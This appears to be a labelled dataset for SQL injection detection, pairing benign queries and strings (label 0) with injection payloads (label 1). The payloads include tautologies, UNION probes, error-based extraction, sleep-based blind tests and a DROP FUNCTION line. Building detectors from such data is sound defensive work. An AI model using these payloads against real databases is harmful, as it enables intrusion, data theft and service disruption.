payload	label
SELECT * FROM leave WHERE church NOT BETWEEN 'combine' AND 'shout'	0
SELECT * FROM can	0
jared	0
barrenechea sadurn	0
44	0
  SELECT * FROM very WHERE found IN  ( 'wash', 'struck', 'powerful' )  	0
SELECT AVG ( truth )  FROM slope  SELECT SUM ( fully ) 	0
SELECT COUNT ( highestID ) FROM cry	0
  SELECT breadID AS ID, ahead AS feed FROM unhappy	0
c/ rua mayor, 31, 1?e	0
1'  )   where 6408  =  6408	1
1   )    )     )   and 6467  =  1864#	1
1' in boolean mode  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --	1
 UPDATE cave SET deal = 'needs'WHERE finger = 'sunlight'	0
landau silvestre	0
"1%"" and 2006  =  2006"	1
SELECT * FROM note 3	0
FROM  ( SELECT DISTINCT dug FROM over ) 	0
  SELECT * FROM lay WHERE breathe IN  ( 'period', 'modern', 'similar' )  	0
1' in boolean mode  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   #	1
   SELECT world, dress, killFROM station WHERE letter  IS NOT NULL	0
"1""  )   where 7513  =  7513 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --"	1
select * from users where id  =  1 %!<@ or 1  =  1 -- 1	1
512155000000000	0
SELECT AVG ( cookies ) FROM branch SELECT SUM ( property ) 	0
"-6453""   )    )    as hehs where 9363  =  9363 union all select 9363,9363,9363,9363,9363,9363,9363,9363,9363#"	1
"1""  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  ""mrsl""  =  ""mrsl"	1
select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'afdy' like 'afdy	1
SELECT COUNT ( question ) FROM produce	0
comandante barja 84,	0
 select * from users where id  =  1<@<@ union select 1,version  (    )   -- 1	1
-9508  )   union all select 9950,9950,9950,9950,9950,9950,9950#	1
SELECT Count ( * )  AS completely	0
1'+  (  select xlvq where 7470  =  7470 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   +'	1
1'   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'bwka'  =  'bwka	1
ag2u7a	0
"1""  )   as zbhs where 2017  =  2017 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --"	1
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367589 ) 	0
to85lo372	0
ollo	0
1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'fuvv'  =  'fuvv	1
 SELECT * FROM this ORDER BY older ASC, clearly DESC	0
SELECT AVG ( closely )  FROM thank  SELECT SUM ( knowledge ) 	0
1' in boolean mode  )   and sleep  (  5  )  #	1
-6566'  )   as kggb where 9768  =  9768 order by 1--	1
49130	0
  UPDATE worry SET seven =  'man', City =  'easily' WHERE hope =  action	0
SELECT COUNT ( stared ) FROM ever	0
1 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) 	1
SELECT * FROM were WHERE flew = 'die'  AND  ( bright = 'cave' OR quick = 'to' ) 	0
1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  'zaes'  =  'zaes	1
SELECT AVG ( Price ) FROM purpose	0
5933500000000000	0
if  (  1928  =  4811  )   select 1928 else drop function ucko--	1
1  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  	1
SELECT TOP 3 * FROM face WHERE coming = 'suggest'	0
amarjit	0
1' or '1'  =  '1	1
